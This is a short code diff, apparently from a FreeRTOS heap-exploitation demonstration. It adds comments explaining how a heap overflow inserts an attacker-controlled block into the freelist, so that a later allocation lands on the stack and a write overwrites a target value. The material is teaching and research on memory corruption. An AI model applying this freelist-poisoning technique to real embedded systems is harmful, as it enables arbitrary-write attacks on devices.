@@ -113,8 +113,14 @@ static void prvHeapTask( void * pvParameters )
     // console_print( "Heap after overflow:");
     // prvDumpHeap(); // This can segfault
 
+    // This next allocation will be redirected by the overflow of the p1 heap region
+    // and the insertion of an attacker controlled heap block into the freelist
     p2 = pvPortMalloc(P2_ALLOC_SIZE);
+
+    // This write would normally simply set a value the newly allocated heap block, but
+    // due to the overflow it will actually overwrite target.pxTarget on the stack.
     (*(uint32_t*)p2) = 0x55;
+
     console_print( "attacker controlled p2 ptr @%p\n", p2 );
     console_print( "exploited target value %p\n", target.pxTarget );
     if ( target.pxTarget == 0x55 ) {
